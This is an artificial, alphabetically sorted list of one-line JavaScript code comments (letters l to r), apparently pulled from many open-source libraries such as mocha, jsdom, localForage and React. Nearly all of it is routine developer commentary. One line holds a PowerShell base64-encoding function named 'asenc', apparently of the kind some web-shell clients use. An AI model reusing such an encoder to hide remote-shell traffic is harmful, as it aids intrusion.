// let's see how we can modify the array field atomically
// let's warn.
// lets resolve to an empty string (nulls are not expected farther up)
// level of logging
// level1/core sets up so that modifying the appropriate attributes on body elements will forward to setting on
// level2/html sets up setters/getters on HTMLBodyElement that proxy to the window (setting data properties there)
// lheading
// liberty of enforcing that. TODO Report this.
// like L
// like Node.
// like the following:
// like x
// likely the result of a `url.parse()` call... we need to
// limitations under the License.
// line being 1-based and column 0-based) will be attached to the
// line break). Used to count lines.
// line comment
// line comment': {
// line comment\n42': {
// line in the response ...
// line numbers in error messages and stack traces.
// linenos
// lines are stored 0-based in SourceMap spec version 3
// link
// linked list can remove elements from the beginning faster than
// links
// list
// list item contains. Hacky.
// list of active jobs
// list of files / patterns to load in the browser
// list of files to exclude
// list of items in order of use recency
// list of punctuation marks from common mark spec
// list(function() {})
// listener on the target node.
// literal syntax is somewhat subtle: the object literal syntax would
// literals only and not for string object.
// load previously collected result set
// load results from cache
// load tab content new every tab click
// load the whole API at once in a single object
// loaded by a script tag in the presence of an AMD loader.
// loaded from the offline store.
// loaded in the global scope.
// localForage also support callbacks:
// localForage.
// localStorage capacity exceeded.
// localStorage fallback. Maybe in the future we won't care...
// localStorage's method API (`localStorage.getItem('foo')`) returns
// localStorage. This feature detection is preferred over the old
// location
// location.js
// location.reload();
// log is just a thin wrapper to console.log that prepends a timestamp
// log resolvers errors/warnings
// logging too much when using transferPropsTo.
// long longValue()
// longer accessible.
// look at the raw listing themselves
// look for a standard JS token or an JSX text node
// look for a standard JS token or an XJS text node
// look for in page anchor
// look for jQuery ajax parameters in settings
// lookahead2 function can cause tokens to be scanned twice and in doing so
// looks like a stream!
// looks like it's the last one
// lookup failed
// lookup in the language model backwards. This in practice exactly simulates
// lookup table from every known type to the appropriate visitor
// loop.
// low byte
// low surrogate
// low-level comparators between versions
// loweCase header keys
// lower the confidence of latin1 so that other more accurate detector
// lruList is a yallist where the head is the youngest
// ls.LSSerializerFilter.prototype.__proto__ = level2.traversal.NodeFiler;
// mPrev and mBeforePrev are initialized to space in order to simulate a word
// magic
// main callback
// maintain a list rather than create a `trapBubbledEvent` for each
// maintain line numbers
// maintain line numbers by calling catchupWhiteSpace over the whole
// make all the buffer merging and length checks go away
// make it a Stream
// make node responseOnEnd() happy
// make path take a bit from prefix
// make sure that all errors get decorated properly
// make sure this.peeked is set
// make sure to call its cancel method to avoid silencing other
// make sure we don't lose the fd before we open the actual read stream
// make sure we have an error to display to console
// make sure we keep comments
// make useful anonymous name
// make useful type name
// makes the latter nonnegative.
// making guarantees rather than safe bets.
// making it explicit this property is not enumerable
// making the same file again should have no effect.
// malfunctioning before w/ IndexedDB.
// manager.query.update(this.currentConf);
// managing destroyed
// manner.
// manual json
// manual x-www-form-urlencoded
// manually should not be returned.
// manually; we need the initial state only for server rendering
// many segments often have the same encoding. We can exploit this
// many users. We can help them out when they expect file:// URIs to
// map the other direction
// map the range to a 2d array of comparators
// map types from key to human-friendly name
// mapReverse is also a thing
// mapped.example.com:* will use 127.0.0.1:8080
// mapping for the given position and then return the opposite position it
// mapping.
// maps api response attributes to internal representation
// maps to a `fs.ReadStream` instance
// mark complete
// mark sync section complete
// markup generated on the server matches the markup generated on the client.
// markup has correct `selected` attributes
// mask = dbMask
// mask = seedMask
// match element with selector
// match missing R/L context
// match.
// matches another field
// matches class selectors
// matches either a quoted-string or a token (RFC 2616 section 19.5.1)
// matches specified regExp
// matchesSelector(:active) reports false when true (IE9/Opera 11.5)
// matching due to characters outside the match
// matching selector (document ordered)
// max depth a tab can be nested
// max digit bits should be 26 because
// max internal value = 2*dvalue^2-2*dvalue (< 2^53)
// maximum results returned from local
// maximum times to look for a position before failing (9 positions total)
// may be a completely synchronous operation which may change
// may be missing if file size is unknown
// may be undefined
// may lead to infinite recursion if we don't delete them here.
// may not replace the cwd with a different kind of thing entirely.
// maybe some DRY opportunity here?
// means end of sequence (needed when one sequence is a strict subsequence of another).
// memoize range parsing for performance.
// merge
// merge text nodes
// message automatically derived from function name
// message automatically derives from property name
// message type
// message.
// meta calculations
// metadata
// method will be POST and Content-Type: 'application/x-www-form-urlencoded; charset=utf-8'
// method's first argument contains any character whose code point is
// methods convert everything to lowercase.
// might accidentally call context.visitWithoutReset. If that
// might have already been set. If this is the case then we'll need
// might still need to split on '='
// millisecond representations. Note that invalid dates with millisecond representations
// mime -> extensions
// minimal 2-byte header
// minimum characters required to search
// minimum time allowed between calls to the cache initialization
// misconfigured and gave for example a LAN IP instead of WAN IP over
// mismatch in the amount of childNodes
// missed a blur event somehow.
// missing features
// missing url parameters
// mixed protocols
// mixing React radio buttons with non-React ones.
// mixins are listed before or after these methods in the spec.
// mock response
// mode depends on properties of the current scope (see
// mode the stream is in. Currently this means that `null` is never accepted
// model probers scores. The answer is returned in the form of the name of the
// modification.
// modified date
// modified for transition to return invoke success
// modified from https://github.com/es-shims/es5-shim
// modified version of https://github.com/mathiasbynens/he/blob/master/src/he.js#L94-L119
// modify Object.prototype to have `should`
// modify behavior of socket events so that we can emit 'error' once for
// module info
// module settings
// module.exports = $.extend(exports);
// module.repaint();
// module: browser/debug.js
// module: browser/diff.js
// module: browser/events.js
// module: browser/fs.js
// module: browser/path.js
// module: browser/progress.js
// module: browser/tty.js
// module: context.js
// module: hook.js
// module: interfaces/bdd.js
// module: interfaces/exports.js
// module: interfaces/index.js
// module: interfaces/qunit.js
// module: interfaces/tdd.js
// module: mocha.js
// module: ms.js
// module: reporters/base.js
// module: reporters/doc.js
// module: reporters/dot.js
// module: reporters/html-cov.js
// module: reporters/html.js
// module: reporters/index.js
// module: reporters/json-cov.js
// module: reporters/json-stream.js
// module: reporters/json.js
// module: reporters/landing.js
// module: reporters/list.js
// module: reporters/markdown.js
// module: reporters/min.js
// module: reporters/nyan.js
// module: reporters/progress.js
// module: reporters/spec.js
// module: reporters/tap.js
// module: reporters/teamcity.js
// module: reporters/xunit.js
// module: runnable.js
// module: runner.js
// module: suite.js
// module: test.js
// module: utils.js
// modules monkey-patch it to support additional encodings
// modulus
// modulus and exponent
// modulus then public exponent
// more efficient because we're iterating backwards through a stack.
// most specific supertype whose name is an own property of the candidates
// mostly just for error reporting
// move the internal cursors
// moved from elsewhere in the AST. The print function is the
// moved.
// msg
// multiple
// must be a function or else the Set would've been reused
// must be given for each.
// must emit end before close.
// must not return true for hasClosingParen(oldPath).
// must test the attribute selector '[class~=xxx]'
// mutation observer to listen for all DOM changes.
// my ip address
// mysql character set mapping
// mysql column type 
// name
// name because lots of broken servers expect Host instead of host and we
// name of category (category view)
// name of variation to use
// name should be either a string or an object.
// name to distinguish between multiple dimmers in context
// namespace binding attribute. push the binding into scope
// namespace contained
// namespace for events
// namespace ignored
// namespace traced
// namespaces form a prototype chain.
// necessary
// need both or neither
// need to keep around a few small chunks of memory
// need to offset them to be relative to the start of the concatenated
// need to restore the `._handle` property.
// need to use `hostname` instead of `host` otherwise `port` is ignored
// needed for Java 8 Nashorn
// needed or are available. If we see a non-continuation byte where we expect
// needed to complete the UTF-8 character (if applicable) are returned.
// needs to be added separately.
// needs to be created to take over in the pool for the one that closed.
// negation
// negative sequences:   0.0009%
// negative sequences:   0.0015%
// negative sequences:  0.0009%
// negative sequences:  0.0020%
// negative sequences:  0.0148%
// negative sequences:  0.0436%
// nested HTML attribute selector
// nested pseudo-class selector
// nested pseudos/separators
// never called
// never changes.
// new animations will occur after previous ones
// new interface
// new property ?
// new syntax features.
// new-style
// newDoc has no key called notToBeSaved since its value was undefined
// newPath and oldPath are fresh local variables.
// newline
// next code unit is the high surrogate of a surrogate pair.
// next test
// next token is a colon and the expression was a simple
// next-to-last char was not a space so self._mPrev is not a 1 letter word
// nextTick implementation with browser-compatible fallback ////
// nextTick so that an exception within scriptComplete won't cause
// no '=' or is at start
// no DOM node should be considered an array-like
// no additional properties & attributes
// no default
// no dependencies
// no effect if infinite
// no element matchers and no seed.
// no espression': {
// no longer allowed.
// no lookup or connect due to keep alive
// no more data
// no more data can be written.
// no need for block level renderers
// no need to bother with the length
// no need to calculate range
// no need to check `index >= 0`
// no password required
// no validation needed here. State machine has done that
// no way (except guessing) to access those properties.
// no way to test this without also not supporting params at all
// no-op in browser
// nobody is listening there
// node
// node and clockseq need to be initialized to random values if they're not
// node may be null
// node we have encountered so far.
// node. In such cases the node will be harmlessly wrapped in an
// node.js
// node.value.loc is very likely untrustworthy (just the {body}
// node::ParseEncoding() requires lower case.
// nodeType < 6 works because attributes (2) do not appear as children
// nodes in order anyway.
// nodes).
// nodes.
// nodes. The replaced method (if any) is returned for easy wrapping.
// nodes. `cur` is used to keep the node that we are currently
// non-ASCII chars
// non-Comment node in the tree.
// non-RFC: allow retention of expired cookies by choice
// non-anonymous divs and catch any error that may otherwise arise. See
// non-ascii chars (utf-8)
// non-default export
// non-loose mode
// non-null. The getter would just always return the current value. This would make it more correctly be null before
// non-printable. One would expect Tab to be as well (but it isn't).
// non-string keys ARE fully supported
// non-xml :nth-child(...) stores cache data on `parent`
// non-zero only
// nonparticipating capturing groups
// noop
// normal identifier.
// normalize
// normalize confidence (we don't want to be 100% sure)
// normalize modulus
// normalize spaces
// normalized at this point
// not ===
// not a direct alias for IE10 compatibility
// not a valid Unicode code point
// not able to have any body at all.  In the very rare chance that
// not an integer
// not aware of a BIDI rendering algorithm. The renderer sees the text and
// not doing anything special.  Use the globalAgent
// not escaped
// not extract events. See #3639.
// not found
// not get any new fields added to them at this point.
// not handling '\' and handling \u2028 or \u2029 to unicode escape sequence
// not happen before the first read call.
// not happen before the first write call.
// not have the same name as the catch parameter should count
// not including [0]=node
// not null/false
// not really sure how to test this
// not support saving the `null` type in IndexedDB. How
// not support';
// not supported by IE8 Query Selector
// not that fast snoopy
// not the higher-order bits that specify file type
// not the predicate (which is applied later)
// not use raw property
// not window
// not work. This is required to get the phantomjs passing...
// not zero indexed
// not: function () {
// note that IE<9 does not support __defineGetter__ or __defineSetter__ so it just renders the method harmless)
// note we can use the second argument on the callback
// note: delete puts the object in dictionary mode.
// nothing
// nothing buffered
// nothing in between them to be parsed as `null` (which is needed
// nothing is allowed
// nothing is forbidden
// nothing special
// nothing to see here!
// nothing.
// notify control skip / break
// now access req.text
// now access this.text
// now assigned at runtime from config options
// now go and do stuff with it...
// now we need to remove `args[index]` since it's inlined in the `format`
// npm 3.x
// nth-* requires argument
// null
// null input.
// null original source location
// null pad after the body
// null);
// null; it's not in the source
// numRemoved = 1
// numRemoved = 3
// numReplaced = 1
// numReplaced = 3
// number of bytes are available.
// number of pending user-supplied write callbacks
// number when it is not the default port.
// number.
// numberChars before otherChars so that leading-decimal doesn't become .
// numberify any prerelease numeric ids
// numeric literal specifying the number of named parameters the
// numeric x and y parameters for Expr.filter.CHILD
// numerically zero.
// obj with keys in a consistent order.
// object
// object containing all templates endpoints
// object stream flag to indicate whether or not this stream
// object stream flag. Used to make read(n) ignore n and to
// object to discourage reaching into it until the API stabilizes.
// object to search
// object will indicate what failed.
// object.
// object. This is always true on Node.js >= 8 but not on Node.js 6 where
// objects as the entries.
// objects that have a parent because that lets us optimize more.
// objects where keys correspond to characters in sequence and leafs are the encoded dbcs values. A special DEF_CHAR key
// obsolete
// obsolete.
// odd number of slashes means | is escaped
// of `NaN` are not equivalent.
// of `getItem()` later. This leads to some weirdness
// of `undefined`.
// of a previous response if a `cache` was provided
// of an existing parse tree.
// of how much we're waiting to get pushed to some underlying
// of initialize -- if it's still set to OBSERVED_ERROR in the finally
// of the comment. This only really matters for multiline Block
// of the next token (this is useful for Tern)
// of the public this.props because the post processing cannot determine
// of the same name in an outer scope.
// of the syntax is to be deferred arbitrarily long until the end of the parentheses pair (plus a lookahead)
// of the tree are as expected and the binary search tree constraint is respected
// of the type given by its first argument.
// of those lines.
// offset
// offset container (or 3d context)
// offset for the last piece
// offset in a string. Useful for parsing mixed-language formats
// offset on aligning axis from calculated position
// offset to use with scroll top
// offset. `input` should be the code string that the offset refers
// often exceed the limits of JS numbers.
// often referred to. `finishOp` simply skips the amount of
// often you call it. Useful for lazy initialization.
// ok() callback can throw
// old bug where we used the wrong regex
// old interface
// old school shim for old browsers
// old tar versions marked dirs as a file with a trailing /
// oldNode used to be.
// older releases of node still supported by this library.
// on DOM elements
// on a disconnected node (IE 9)
// on all the other hard-coded values from zlib v4736.  When node v6
// on mouseout sets text to previous value
// on next tick (4)
// on symlinks in extraction path
// on the source.  This would be more elegant with a .once()
// on update callback
// on values up to 2*hdvalue^2-hdvalue-1 (< 2^31)
// onMouseEnter/onMouseLeave created by `EnterLeaveEventPlugin`.
// once the file is written let's email a link to it...
// one and only one of the following properties should be present
// one is it is made by the HebrewProber by combining final-letter scores
// one is subscribed for to avoid memory leak.
// one of these calls threw.
// one pass validation only
// one time
// one who launches the application that the value makes sense.
// onebigchunk is a string if the stream
// only 0b or 0B
// only 0o or 0O
// only 0x
// only 2 items were set using localForage.
// only Element has .getAttributeNode
// only actual end gets this treatment
// only add default path if not remote content
// only after passing all other standard
// only allow simple selectors nested in ':not()' pseudo-classes
// only animation provided
// only apply the prefix to hard links.
// only checked if namespaces is true
// only duration provided
// only emit error event if there is a listener
// only encode : chars that aren't drive letter indicators
// only fields for which validity applies
// only find elements > 1
// only flow one buffer at a time
// only for successfully finished streams
// only last slice before :not rules
// only non-strict
// only number <64 is sure valid
// only process the first entry
// only retry on a specific error
// only specified in the WHATWG spec document. See
// only the permissions and setuid/setgid/sticky bitflags
// open match group
// open tag
// open transaction issue?
// opening doubles
// opening singles
// operate on buffers in-place
// operating systems these days (capturing the result).
// operations on the database (initiated by some other instances).
// operator that has a lower precedence than the set it is parsing.
// operatorName | nodeType | functionName | axisName are lumped into
// operators descriptor
// operators like `+=`.
// optimization for two node-sets case: avoid n^2 comparisons.
// optimized http://stackoverflow.com/questions/53497/regular-expression-that-matches-valid-ipv6-addresses
// optimized https://www.safaribooksonline.com/library/view/regular-expressions-cookbook/9780596802837/ch07s16.html
// option val if it takes an arg
// option.value not trimmed (#14858)
// optional
// optional .typeAnnotation field.
// optional .typeParameters field.
// optional callback
// optional in the Babel/Acorn AST format.
// optional indentation
// optional replacement
// optional; non-enumerability is the default
// optionally add iv and salt
// optionally extract iv and salt
// optionally filtered by a selector.
// optionally). Delegates to **ECMAScript 5**'s native `Function.bind` if
// options
// options = options || $.fn.options;
// options enabing specific engine functionality
// options in Safari work properly
// options set to {} since the default for multi is false
// options to modify validated data:
// or
// or :nth-last-child(...) or :nth(-last)?-of-type(...)
// or ESM/TypeScript import
// or `arguments`.
// or `foldl`. Delegates to **ECMAScript 5**'s native `reduce` if available.
// or `new Whatever()`
// or `{}`.
// or close curly (#125) for template middle or template tail.
// or cross-browser client API
// or doesn't exist.  give up.
// or guess it from the filepath or filename
// or http response
// or if it's http-reponse
// or just emit the charStr
// or just load the bits you need
// or not we have a name for the root value. The difference between the
// or only normal fields. Mixed objects are not allowed
// or request stream http://github.com/mikeal/request
// or similar
// or tar.create
// or tar.extract(
// or the first comma. This situation also defers the determination of all the expressions nested in the pair.
// or the form element we belong to
// or treat it as options object
// or try http response
// or undefined
// or use the pollyfill
// or when there is no matching style property that exists.
// or wildcard host
// or } (U+007D) for template middle or template tail.
// or:
// or: function (word) {
// order is valid
// order to perform operations on intermediate results within the chain.
// order to produce the correct `offset` value.
// original
// original 
// original source location
// other
// other HTTP-level error
// other component types?
// other events and have it go through ReactBrowserEventEmitter. Since it
// other headers fails.
// other is ancestor of reference
// other numeric values.
// other options set selectedness to false
// other packages using the methods package and
// other types prohibit arguments
// other values for this name are still present
// otherwise IE won't interpret it correctly.
// otherwise go with full three arguments
// otherwise local PhantomJS test
// otherwise step value is 2 to skip over Left and Right
// otherwise they will most likely get fused together into a single token.
// otherwise we assume the callback to `.end()` will get the error
// otherwise we skip this part
// outer circle
// output: '1 000B'
// output: '1 KB'
// output: '1000B'
// output: '1KB'
// output: '2KB'
// output: 1024
// outputs: function
// over and underflow not realistically a concern: V8's getTime() seems to
// overflow b1
// overflowY are set to the same value
// override `on` to capture data listeners
// override `setEncoding` to capture encoding
// override display if necessary so animation appears visibly
// override it in later call
// override this function in implementation classes.
// overrides all per-namespace log settings
// overriding opacity value
// oversized objects fall out of cache automatically.
// overwrite falls back to clobber
// overwritten while composition continues.
// owned components.
// owner and current displayName as the key.
// p = 2^128 - 2^97 - 1
// p = 2^160 - 2^31 - 1
// p = 2^160 - 2^32 - 2^14 - 2^12 - 2^9 - 2^8 - 2^7 - 2^3 - 2^2 - 1
// p = 2^192 - 2^32 - 2^12 - 2^8 - 2^7 - 2^6 - 2^3 - 1
// p = 2^192 - 2^64 - 1
// p = 2^224 (2^32 - 1) + 2^192 + 2^96 - 1
// p = 2^224 - 2^96 + 1
// p mod 4 == 1
// p mod 4 == 3
// p455w0rd
// pad x so am has enough room later
// padding with edge of page
// page down (show next page)
// parameter lists) makes a valiant attempt to prevent really long
// params
// parent CallExpression passes the hasParens test. If we relied on
// parent and stops once it reaches the src parent or the root path.
// parentInfo should always be present except for the top-level
// parentPath.value[name] if we have a parentPath.
// parentValue[path.name] and update parentCache accordingly.
// parentheses.
// pars can be interrupted by type (6) html blocks
// parse HTML object param element's name-value pairs
// parse a file upload
// parse json string
// parse out just the options we care about so we always get a consistent
// parse provided url if it's string
// parse5 supports doctypes directly
// parseType(type);
// parser use them properly (the presence of these properties is
// parseutils.js
// partial application example:
// pass
// pass along options.knownLength
// pass is optional and can be replaced with options
// pass methods references to compiled resolvers
// pass through
// pass toggle
// passed-in arrays.
// passes PropTypes.object.
// passing a function returning a promise
// passing a regular synchronous function
// passing around state in a gazillion args.
// passing calculations
// passing it to async. Now the square function will be executed in its 
// passing the tree produced by parsing the first file as
// password required
// path
// path => [function or Set]
// path could have been a directory and we got a listing of its
// path.normalize(path)
// path.parent.node refers to it:
// pattern like
// pattern that would not be detected by this substitution.
// pattern. The CoverInitializedName check is deferred.
// pattern: https?+unix://SOCKET_PATH/REQUEST_PATH
// pause caching while we are getting
// pause stream
// pause() and resume() are remnants of the legacy readable stream API
// pause/resume are no-ops in sync streams.
// pax headers
// penalty
// penalty.
// pend.wait will have to wait for this hold to finish
// pending
// people.mozilla.org/~jorendorff/es6-draft.html
// percentage
// perform real require()
// performance data output
// persist previous parsed data
// physical keyboard key.
// piece
// pipe to unzip
// pipeline A
// pipeline B
// piping an ended stream ends immediately
// pjson === data
// placeholder for extensions
// placeholder to add functionalities
// plain-text data is supported
// point compression not supported yet
// pointless async:
// points as used by CESU-8.
// points were copied; start at the beginning otherwise.
// populate map
// populates missing values
// popup itself
// popup should be removed from page on hide
// popup should not close when being hovered on
// popup should remain inline next to activator
// position to prefer when calculating new position
// position where token was found
// position. Interface similar to findNodeAt.
// positions of the export declaration node.
// positive.
// posix version
// possibility to insert one.
// possible errors
// possible values: config.LOG_DISABLE || config.LOG_ERROR || config.LOG_WARN || config.LOG_INFO || config.LOG_DEBUG
// possibly represents an astral symbol or a paired surrogate with a
// post is called 3 times with:"
// postMessage behaves badly on IE8
// potential command injection attacks.
// powered by snyk - https://github.com/backstage/backstage/issues/10343
// practice since future versions can make data import decisions based on
// pre is called 3 times with:
// pre-calculate phase timings as well
// pre-v7
// precedence levels that JavaScript defines.
// precedes the expression. The position of the $ should be the same
// precision.
// precompiled Regular Expressions
// precomputation
// predicate containing a big ugly `switch` statement is faster than
// predicate from a space-separated string of words.
// predicate tester since removing that kind of flexibility gives us the potential for better future optimizations.
// prefers to put the 'alternate' property before 'consequent'.
// prefers to put the 'test' property before 'body'.
// prep body
// prepare global sandbox
// prepare stack trace
// prepatch.
// prepend with the dirname
// preprocess matching files before serving them to the browser
// preservation. This relies on function-hoisting if a constructor function is
// preserve html when selecting value
// preserve it exactly as we found it.
// preserve legacy callbacks
// preserve misspelled callbacks (will be removed in 3.0)
// preserve tie-breaker
// preserves header name case
// pretend different jobs take different time to finish
// pretend that there is a semicolon at this position.
// prettier-ignore
// prettier-ignore"
// pretty-print it as usual.
// prevent ajax submit
// prevent copy if src is a subdir of dest since unlinking
// prevent like /\\[/]/
// prevent menu hiding on immediate re-focus
// prevent queue from being processed during
// prevent rounding issues
// preventDefault).
// preventing stack overflows
// prevents callbacks from occurring on initial load
// prevents focus callback from occurring on mousedown
// prevents placeholder element from being selected when multiple
// preview
// previous
// previous TemplateElement
// previous `stream.Readable` instance as `cache` option to potentially
// previous owner. Returns a reference to the Underscore object.
// primary types are kind of like primary expressions...they're the
// prime-field
// prime1
// prime2
// primitives with which other types are constructed.
// principal node type of the axis.
// print array of template elements
// print blank lines to push the closing ) down to account for the final
// print substitutions
// print the Content-Type header even if the server returned it as 'content-type' (lowercase)
// print the error to STDERR
// print the tag
// prints: this is a tC)st
// private case first
// private key
// private variables
// privateExponent
// prng4.js - uses Arcfour as a PRNG
// procedure for the `setItem()` SQL would solve this problem?
// process received data
// process the abstract event manually.
// process the chunk using the sync process
// process the tag
// process valid selector strings
// process.env.http_proxy = 'http://10.0.0.1:1234';
// process.env.no_proxy = 'example.com';
// process.nextTick or setImmediate depending on your Node version
// processed data
// processing context & root element
// programmatically by other code/scripts
// progress
// promise 1 became fulfilled
// promise with async/await
// promise with then/catch
// promise[ done | fail | progress ] = list.add
// prompt
// propagate carry
// properly
// properly set maxSockets on new agents
// properties to it so it needs to exist.
// properties.
// property assignment in contexts where both object expression
// property by name:
// property is also supported for OpenGraph in meta tags.
// property names for remote query
// property since it may be `null` if it represents a regular expression
// property to emulate a data property that does not suffer from
// property type before comparing; only `value` does and is string.
// propertychange handler and looking for events with propertyName
// propertychange on the first input event after setting `value` from a
// protected
// prototype function
// prototype lookup in a very sensitive hot path.
// prototype primitive
// prototype selector unit need this method to recover bad HTML forms
// provide a name does not actually want a source map.
// provide an object.
// provided site
// provides a surprisingly accurate mapping for US and European users.
// providing the name argument is not necessary in most cases.
// proxy all the other methods.
// proxy certain important events.
// proxy servers
// pseudo-class and similar UI states (indeterminate)
// pseudo-class names are case-insensitive
// pseudo-classes parameters
// pseudo-elements selectors
// pub/sub pattern
// public
// public-key RFC3110 ?
// publicExponent
// publicly exposed byClass
// publicly exposed byId
// publicly exposed byName
// publicly exposed byTag
// publishes scrollchange event on one scroll
// pull response from xhr if available
// pusher
// put that good code in getHeaders to some use
// qName for now; we'll check them on pop.
// qSa(:focus) reports false when true (Chrome 21)
// quacks like an array
// quality.
// query shortcuts
// query string
// queryValue is an actual object. Determine whether it contains comparison operators
// queryValue is either a native value or a normal object
// querystring
// r < writeLen
// r = x^2 mod m; x != r
// race condition to set _dbInfo
// raise an unexpected token error.
// raise the original error.
// raises(DOMException) on retrieval
// raises(DOMException) on setting
// raises(DOMException);
// raises(dom::DOMException);
// range checking
// rare.
// rarely (never?) useful to write a less-than sign after an JSX
// raw - no header
// re-assign for implicit secure connections
// re-uses the `req` instance but changes its `url` field (i.e. in the case of
// reach the correct column too.
// reactMountReady is the our only stateful wrapper
// read entries always start life paused.  this is to avoid the
// read just some of it.
// read only one file to get the version number
// read part of list
// read the node attribute object
// read the value of the attribute
// read to zero (because it's looking at the length of the
// readable
// readable = 'filter[0][]=int1&filter[0][]==&filter[0][]=77&filter[]=and&filter[2][]=int2&filter[2][]==&filter[2][]=8'
// readable and reset the state. However this needs to happen
// reads 404 page as a successful response
// ready to be split into comparators.
// ready to make signed requests on behalf of the user
// ready when it's been initialized (default) *and* there are no pending
// readyState DONE
// reason.message === 'WHOOPS'
// reasons that are too expensive and fragile to test.
// rebuild the validator and other REs
// recalculate often.
// recast.parse as options.parser (legacy synonym: options.esprima).
// receives 'foo' right away
// recognized.
// recommended 'fail'
// recommended default implementation:
// reconciliation
// reconsider the current character even so it interrupted the sequence
// record how many byte needed to complete that character and skip these bytes here.
// record line breaks in transformed source
// record where we are
// records.
// recover by searching for path.value in parentValue.
// recover from test
// recursively check if dest parent is a subdirectory of src.
// redeclarations (TOK_NAME nodes with lexdef)
// redefine the error message
// redefine the error name
// redefining Function.prototype.call or .apply.
// redefining this property.
// redefinition of exported properties.
// redir.example.com:555 will use 127.0.0.1:555
// redirect
// redirect the user to the authorize uri
// reference
// reference to this (modified) FastPath object. Note that the stack will
// referenced schema options:
// reflect the original throwing context.
// refresh
// refresh selector cache
// regarding Nodelist length in IE
// regexp
// registered function
// regular expression literal
// regular expression literal. This is to handle cases like
// regular expression specified as /baz/gi (flags)
// regular expression to trim extra leading/trailing whitespace in selector strings
// regular expression used in convertEscapes and unescapeIdentifier
// regular expression).
// regular expressions that are only valid in combination with the
// reject if we are waiting for data in the Promise
// reject straight away
// rejection from this promise.
// relative JSON-pointer: http://tools.ietf.org/html/draft-luff-relative-json-pointer-00
// relative and absolute paths)
// release memory in IE
// relevant at this point.
// relinquish responsibility for this `req` to the Agent
// rely on default functions to reconcile the conflicting AST formats.
// remaining wrappers but silence any exceptions from them to ensure
// remains safe:
// remember that false/true cast respectively to 0/1
// remove all add header except User-Agent
// remove all following nodes up until the closing comment.
// remove all handlers
// remove all selected labels
// remove all.
// remove any authorization headers).  Also remember the case of the header
// remove any duplicate nodes. If the array contains nodes that do not belong
// remove any reserved functions from the options object
// remove bytes belonging to the current character from the buffer
// remove callback param
// remove element only if was created dynamically
// remove events
// remove indexed properties from list
// remove listeners to avoid memory leaks
// remove mutation events
// remove namespace bindings introduced by tag
// remove node
// remove preceding slash if set
// remove previous callbacks
// remove specific handler
// remove the `path` portion so that `net.connect()` doesn't
// remove this label only
// remove value
// removeAttr style does not consistently work in safari
// removeSubsets
// removed.
// rename all top level variables to keep them local to the module
// renaming exports to local variables `moduleName_export_exportName`
// render (both initial renders and updates). Useful when looking at prod-mode
// render anything to the DOM and return a mapping of their ID to
// render but we still don't expect to be in a render call here.)
// render landing strip
// rendered as props.
// renderer.
// replace
// replace Operators parameter if needed
// replace X with 0
// replace every surrogate pair with a BMP symbol
// replace module reference
// replace module.exports.bar with a variable for the named export
// replace require calls with the corresponding value
// replace variables
// replacement character. See https://codereview.chromium.org/121173009/ .
// replies with 150 and then a final reply to indicate whether the
// representations. I.e. ART. Once those are updated to use the string
// representing `require('bar')` wherever `foo` was used.
// reprinter to keep track of reused code so that it can construct a
// reproduce in bash:
// request
// request aborted
// request details
// request finished without aborting
// request's wrapper and monkey patch it with our jar.
// request.destroy just do .end - .abort is what we want
// request.method = 'GET' // Force all redirects to use GET || commented out fixes #215
// require localforage as defined in package.json
// require the callback without promises
// require('./bmenu.css');
// require('ajv-async')(ajv);
// require('script!../'); // optionally use webpack/script-loader
// require()-s are direct to support Browserify.
// require(X) from module at path Y
// requires ajv-async package
// requires the array) to play nice here.
// res.body will be a browser native Blob type here
// res.text.should.be.empty
// reset
// reset because shorthand default was used correctly
// reset context data when it changes
// reset errors
// reset leftover jobs
// reset lookahead token
// reset state
// reset the cache
// reset the startTime and lastTime to now
// reset values
// resize the cache when the lengthCalculator changes.
// resize the cache when the max changes.
// resolve deps by returning
// resolves . and .. elements in a path array with directory names there
// respect NO_PROXY environment variables (see: https://lynx.invisible-island.net/lynx2.8.7/breakout/lynx_help/keystrokes/environments.html)
// respecting firingIndex overrides and runtime changes
// response
// response timeout
// responseText is accessible only if responseType is '' or 'text' and on older browsers
// responsible for printing node.decorators.
// rest  sequences:      0.087%
// rest  sequences:      0.1237%
// rest  sequences:     0.0359%
// rest  sequences:     0.2992%
// rest  sequences:     0.8894%
// rest  sequences:     1.0230%
// rest parameters.
// restrict modules/tests by get parameters
// restricted name of A-Z / a-z
// result callback
// result description
// result ignored
// result image
// result is either true or false to indicates whether the callback
// result is object containing the userIds grouped by age
// result now equals 'done'
// result now equals 'done'    
// result now equals 15
// result now equals the first file in the list that exists
// result of a url.parse() call?
// result price
// result spans more than one buffer
// result title
// result url
// result: the result returned from checkPropertyChange or validate
// results
// results is for internal usage only
// results is now an array of stats for each file
// results is now an array of the response bodies
// results is now the original array of files sorted by
// results now equals an array of missing files
// results now equals an array of the existing files
// results show looking glass icon and recent searches on input
// results.one.value = 'one'
// results.readData is the file's contents
// results.three.value = 'three'
// results.two.error = 'two'
// results.write_file contains the filename returned by write_file.
// results[0].value = 'one'
// results[1].error = 'bad stuff happened'
// results[1].error = Error('bad stuff happened')
// results[2].value = 'two'
// resume within the same tick will have no
// resume()
// retaining its member types.
// retrieve element by id attr
// retrieve elements by class name
// retrieve elements by name attr
// retrieve elements by tag name
// return 'File not found' for directories
// return `function asenc(){ param ([Parameter(ValueFromPipeline)]$s) process{ [System.Convert]::ToBase64String([System.Text.Encoding]::Default.GetBytes($s));}};`
// return a compiled function
// return a set of parent dirs for a given path
// return array of parent elements
// return bigint initialized to value
// return bound function
// return boundaries that have been surpassed
// return current node
// return found direction
// return if we do not know the name of the (root) value.
// return its order if it is hiragana
// return number of 1 bits in x
// return object {k: v}
// return processed data
// return property path array from root to current node
// return ret;
// return salvaged results
// return string
// return text;
// return the address.
// return the expected data based on which path was taken[*]
// return the first element
// return the queues for each path the function cares about
// return the same object.
// return this.shiftL(n).or(this.shiftR(64 - n));
// return this.shiftR(n).or(this.shiftL(64 - n));
// return to original working directory
// return type of current node
// returned by next() and store the error
// returned true for any element or not.
// returned when calling write again with the remaining bytes.
// returns '' if beyond length of sTo.
// returns 0
// returns 0.
// returns 1337
// returns 2
// returns 2.
// returns `true` if the `mtime` of the 2 stat objects are equal
// returns a new Array with the elements that are in a but not in b
// returns an abstract syntax tree as specified by [Mozilla parser
// returns bit length of the integer x
// returns either the webkit version or false if not webkit
// returns false
// returns page title for path
// returns the index of the closest mapping less than the needle. By
// returns the value of 1em in pixels
// returns true
// reuse the connection.
// reuse the free corkReq.
// reverse (must be first)
// reverse callbacks
// reverse the order of the letters in the lookup
// reverse umask first (~)
// right = other
// right arrow (show sub-menu)
// right choice because it gives us the opportunity to reprint
// right position.
// root node
